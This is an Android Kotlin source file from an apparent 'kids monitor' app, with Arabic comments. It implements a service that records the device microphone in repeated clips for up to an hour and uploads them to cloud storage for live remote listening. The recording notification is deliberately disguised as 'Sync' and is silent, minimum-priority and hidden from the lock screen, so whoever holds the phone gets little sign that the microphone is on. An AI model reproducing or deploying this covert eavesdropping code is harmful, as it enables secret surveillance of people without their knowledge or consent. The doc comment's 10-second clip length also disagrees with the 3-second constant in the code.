package com.kids.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.kids.monitor.data.FirestoreSync
import com.kids.monitor.data.Permissions
import com.kids.monitor.data.StorageUploader
import java.io.File

/**
 * استماع أحادي الاتجاه: يسجّل مقاطع 10 ثوانٍ من مايك الجهاز ويرفعها فوراً
 * إلى users/{uid}/devices/{deviceId}/mic/ ثم يحدّث live/mic.
 * لا يرسل أي صوت من لوحة التحكم إلى الجهاز.
 */
class MicService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var looping = false
    private var recorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var startedAt = 0L

    private val loopTask = object : Runnable {
        override fun run() {
            if (!looping) return
            if (System.currentTimeMillis() - startedAt > MAX_SESSION_MS) {
                looping = false
                stopRecorder(upload = false)
                stopSelf()
                return
            }
            startClip()
        }
    }

    override fun onCreate() {
        super.onCreate()
        FirestoreSync.init(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            looping = false
            handler.removeCallbacksAndMessages(null)
            stopRecorder(upload = false)
            stopSelf()
            return START_NOT_STICKY
        }
        if (intent?.action == ACTION_RECORD_ONCE) {
            if (!Permissions.has(this, android.Manifest.permission.RECORD_AUDIO)) {
                stopSelf()
                return START_NOT_STICKY
            }
            startForegroundSafely()
            recordOnce()
            return START_NOT_STICKY
        }
        if (!Permissions.has(this, android.Manifest.permission.RECORD_AUDIO)) {
            FirestoreSync.logError(this, "mic", "صلاحية الميكروفون غير مفعّلة")
            stopSelf()
            return START_NOT_STICKY
        }
        try {
            startForegroundSafely()
        } catch (e: Exception) {
            FirestoreSync.logError(this, "mic", e.localizedMessage ?: "تعذر تشغيل خدمة المايك")
            stopSelf()
            return START_NOT_STICKY
        }
        looping = true
        startedAt = System.currentTimeMillis()
        handler.removeCallbacks(loopTask)
        handler.post(loopTask)
        return START_STICKY
    }

    override fun onDestroy() {
        looping = false
        handler.removeCallbacksAndMessages(null)
        stopRecorder(upload = false)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startClip() {
        stopRecorder(upload = false, reschedule = false)
        val file = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
        try {
            val mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            mr.setAudioSamplingRate(16000)
            mr.setAudioEncodingBitRate(24000)
            mr.setOutputFile(file.absolutePath)
            mr.prepare()
            mr.start()
            recorder = mr
            currentFile = file
            handler.postDelayed({ stopRecorder(upload = true) }, CLIP_MS)
        } catch (e: Exception) {
            recorder = null
            currentFile = null
            FirestoreSync.logError(this, "mic", e.localizedMessage ?: "تعذر بدء التسجيل")
            handler.postDelayed(loopTask, 3000L)
        }
    }

    private fun stopRecorder(upload: Boolean, reschedule: Boolean = true) {
        val mr = recorder ?: return
        recorder = null
        val file = currentFile
        currentFile = null
        try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
        try { mr.release() } catch (e: Exception) { /* تجاهل */ }
        if (file == null) return
        if (upload) {
            Thread {
                publish(file)
                file.delete()
                handler.postDelayed(loopTask, 300L)
            }.start()
        } else {
            file.delete()
            if (looping && reschedule) handler.postDelayed(loopTask, 300L)
        }
    }

    private fun publish(file: File) {
        if (!file.exists() || file.length() < 512) return
        val url = StorageUploader.uploadSync(file, "mic/${file.name}")
        val inline = if (url == null) StorageUploader.inlineData(file) else null
        if (url == null && inline == null) {
            FirestoreSync.logError(this, "mic", "تعذر رفع المقطع (قواعد Storage؟)")
            return
        }
        FirestoreSync.setLive(
            this, "mic",
            mapOf(
                "name" to file.name,
                "url" to (url ?: ""),
                "dataUrl" to (inline ?: ""),
                "type" to "audio",
                "mimeType" to "audio/mp4",
                "size" to file.length(),
                "mic" to true,
                "timestamp" to System.currentTimeMillis(),
            ),
        )
    }

    /** تسجيل لقطة واحدة (30 ثانية) تُحفظ في media للتنزيل الدائم. */
    private fun recordOnce() {
        looping = false
        handler.removeCallbacksAndMessages(null)
        stopRecorder(upload = false)
        Thread {
            val file = File(cacheDir, "record_${System.currentTimeMillis()}.m4a")
            try {
                val mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                mr.setAudioSource(MediaRecorder.AudioSource.MIC)
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                mr.setAudioSamplingRate(16000)
                mr.setAudioEncodingBitRate(32000)
                mr.setOutputFile(file.absolutePath)
                mr.prepare()
                mr.start()
                Thread.sleep(30_000L)
                try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
                try { mr.release() } catch (e: Exception) { /* تجاهل */ }
                if (file.exists() && file.length() > 512) {
                    val url = StorageUploader.uploadSync(file, "mic/${file.name}")
                    val inline = if (url == null) StorageUploader.inlineData(file) else null
                    if (url != null || inline != null) {
                        FirestoreSync.appendItem(
                            this, "media",
                            mapOf(
                                "name" to "تسجيل مايك ${file.name}",
                                "url" to (url ?: ""),
                                "dataUrl" to (inline ?: ""),
                                "type" to "audio",
                                "mimeType" to "audio/mp4",
                                "size" to file.length(),
                                "mic" to true,
                                "timestamp" to System.currentTimeMillis(),
                            ),
                        )
                    }
                    file.delete()
                }
            } catch (e: Exception) {
                FirestoreSync.logError(this, "mic", e.localizedMessage ?: "تعذر التسجيل")
            }
            stopSelf()
        }.start()
    }

    private fun startForegroundSafely() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE,
            )
        } else {
            startForeground(NOTIFICATION_ID, buildNotification())
        }
    }

    private fun buildNotification(): Notification {
        val openApp = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setContentTitle("المزامنة")
            .setContentText("المايك يعمل")
            .setContentIntent(openApp)
            .setPriority(Notification.PRIORITY_MIN)
            .setShowWhen(false)
            .setSound(null)
            .setVisibility(Notification.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_NONE)
                .apply {
                    description = "خدمة الميكروفون"
                    setShowBadge(false)
                    setSound(null, null)
                    enableVibration(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET
                }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        private const val ACTION_STOP = "com.kids.monitor.STOP_MIC"
        private const val ACTION_RECORD_ONCE = "record_once"
        private const val CHANNEL_ID = "mic_stream_v2"
        private const val NOTIFICATION_ID = 1004
        private const val CLIP_MS = 3_000L
        private const val MAX_SESSION_MS = 60 * 60 * 1000L

        fun start(context: Context) {
            val intent = Intent(context, MicService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                FirestoreSync.logError(context, "mic", e.localizedMessage ?: "تعذر بدء الخدمة")
            }
        }

        fun stop(context: Context) {
            try {
                context.startService(Intent(context, MicService::class.java).setAction(ACTION_STOP))
            } catch (e: Exception) { /* تجاهل */ }
        }

        fun recordOnce(context: Context) {
            val intent = Intent(context, MicService::class.java).setAction(ACTION_RECORD_ONCE)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                FirestoreSync.logError(context, "mic", e.localizedMessage ?: "تعذر بدء التسجيل")
            }
        }
    }
}
